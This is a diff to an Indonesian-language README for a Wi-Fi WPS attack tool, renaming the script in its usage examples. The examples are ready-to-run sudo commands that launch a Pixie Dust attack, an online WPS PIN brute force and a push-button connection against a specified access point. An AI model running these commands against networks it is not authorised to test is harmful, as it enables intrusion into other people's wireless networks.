@@ -103,19 +103,19 @@ pip install pyfiglet requests
 ## Contoh penggunaan
 Mulai serangan Pixie Dust pada BSSID yang ditentukan:
  ```
- sudo python3 ibnu.py -i wlan0 -b 00:90:4C:C1:AC:21 -K
+ sudo python3 WifiHack.py -i wlan0 -b 00:90:4C:C1:AC:21 -K
  ```
 Tampilkan jaringan yang tersedia dan mulai serangan Pixie Dust pada jaringan yang ditentukan:
 
 ```
- sudo python3 ibnu.py -i wlan0 -K
+ sudo python3 WifiHack.py -i wlan0 -K
  ```
 Lakukan serangan brute force WPS online dengan separuh pertama PIN yang ditentukan:
 
 ```
- sudo python3 ibnu.py -i wlan0 -b 00:90:4C:C1:AC:21 -B -p 1234
+ sudo python3 WifiHack.py -i wlan0 -b 00:90:4C:C1:AC:21 -B -p 1234
  ```
  Mulai koneksi tombol tekan WPS:
  ```
- sudo python3 ibnu.py -i wlan0 --pbc
+ sudo python3 WifiHack.py -i wlan0 --pbc
  ```
